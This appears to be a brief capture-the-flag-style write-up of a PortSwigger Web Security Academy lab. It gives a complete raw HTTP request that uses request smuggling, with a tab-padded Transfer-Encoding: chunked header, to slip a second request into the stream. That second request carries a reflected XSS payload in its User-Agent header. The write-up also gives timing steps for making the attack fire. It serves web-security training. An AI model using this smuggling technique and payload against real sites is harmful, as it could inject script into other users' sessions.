Exploiting HTTP request smuggling to deliver reflected XSS

No more content-length tweaking, this one is simpler. You can inject an XSS payload in the user agent, so let's do just that:

POST / HTTP/1.1
Host: ac401f351eff97bd80f2228d005b0082.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss
Connection: close
Cookie: session=0KVGcoz1kSKgYKYS9PQr2bkv6Cnb6sbs
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: 	chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1

Send the request a bunch of times, roughtly once every 10 seconds. It should trigger within a minute. 
If you want to test that it works, send the request so that you get a 200 response and navigate to the blog post you used (5 in this case). You should XSS yourself.